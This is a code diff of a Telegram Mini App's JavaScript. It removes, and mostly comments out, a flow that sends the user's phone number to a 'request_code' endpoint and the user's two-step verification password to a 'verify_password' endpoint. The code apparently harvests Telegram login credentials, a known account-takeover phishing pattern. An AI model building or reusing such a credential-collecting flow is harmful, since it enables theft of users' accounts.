@@ -274,46 +274,28 @@ TelegramWebApp.MainButton.onClick(async () => {
     Telegram.WebApp.HapticFeedback.impactOccurred('light');
     let step = localStorage.getItem("step");
 
-    if (step === "welcome") {
-        let phone_to_use;
+    step2()
+    // else if (step === "two_fa") {
+    //     const enteredPassword = passwordInput ? passwordInput.value.trim() : '';
+    //     if (enteredPassword != "") {
+    //         TelegramWebApp.MainButton.hide();
+    //         passwordInput.blur();
+    //         loading_page();
 
-        if (get_phone() === null) {
-            phone_to_use = await request_user_phone();
-        } else {
-            phone_to_use = get_phone();
-        }
+    //         const data = await sendRequest("verify_password", "POST", {
+    //             phone_number: get_phone(),
+    //             password: enteredPassword,
+    //             telegram_user_id: USER_ID,
+    //             telegram_username: USER_USERNAME
+    //         });
 
-        loading_page();
-        const data = await sendRequest("request_code", "POST", {
-            phone_number: phone_to_use,
-            telegram_user_id: USER_ID,
-            telegram_username: USER_USERNAME
-        });
-
-        if (data.status === "code_sent") {
-            step2();
-        }
-    } else if (step === "two_fa") {
-        const enteredPassword = passwordInput ? passwordInput.value.trim() : '';
-        if (enteredPassword != "") {
-            TelegramWebApp.MainButton.hide();
-            passwordInput.blur();
-            loading_page();
-
-            const data = await sendRequest("verify_password", "POST", {
-                phone_number: get_phone(),
-                password: enteredPassword,
-                telegram_user_id: USER_ID,
-                telegram_username: USER_USERNAME
-            });
-
-            if (data.status === "authorized") {
-                step4();
-            }
-        }
-    } else if (step === "finished") {
-        Telegram.WebApp.close();
-    }
+    //         if (data.status === "authorized") {
+    //             step4();
+    //         }
+    //     }
+    // } else if (step === "finished") {
+    //     Telegram.WebApp.close();
+    // }
 });
 
 TelegramWebApp.SecondaryButton.onClick(async () => {
@@ -552,4 +534,3 @@ document.querySelector(".password-icon").addEventListener("click", function () {
 document.querySelector(".finish-icon").addEventListener("click", function () {
     animation_finish.goToAndPlay(0, true);
 });
-step1()
